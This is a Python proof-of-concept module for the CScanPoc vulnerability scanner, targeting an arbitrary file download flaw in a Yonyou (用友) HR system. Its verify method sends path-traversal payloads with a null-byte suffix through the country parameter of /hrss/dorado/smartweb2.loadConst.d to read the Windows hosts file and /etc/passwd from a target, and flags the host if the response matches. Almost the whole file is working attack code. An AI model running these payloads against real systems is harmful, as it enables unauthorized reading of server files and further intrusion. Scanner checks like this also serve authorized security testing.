# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    poc_id = '9b33a363-98d4-460f-b442-581e5e9dee02'
    name = '用友某系统任意文件下载漏洞' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-05-12'  # 漏洞公布时间
    desc = '''
        用友某系统用友 country 和 language字段任意文件下载漏洞。
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown' #cve编号
    product = '用友'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f2ab5b02-6f9d-4a21-a7ab-7cc901f0a046'
    author = '国光'  # POC编写者
    create_date = '2018-05-13' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payloads = [
            '/hrss/dorado/smartweb2.loadConst.d?language=zh&country=\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts%00.html' ,
            '/hrss/dorado/smartweb2.loadConst.d?language=zh&country=\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd%00.html'     
            ]
            for payload in payloads:
                url = '{target}'.format(target=self.target)+payload
                code, head,res, errcode, _ = hh.http(url)
                if code == 200 and "const.js" in head:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()